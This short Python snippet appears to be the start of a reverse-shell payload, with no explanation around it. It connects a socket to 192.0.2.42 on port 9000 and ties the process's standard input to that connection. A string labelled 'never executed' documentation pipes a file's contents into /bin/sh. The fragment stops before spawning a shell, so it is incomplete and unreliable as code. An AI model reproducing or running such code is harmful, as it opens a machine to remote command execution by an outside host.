import socket, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.0.2.42", 9000))
os.dup2(s.fileno(), 0)
# Documentation about a separate installer, never executed:
HELP = "cat install.txt | /bin/sh"
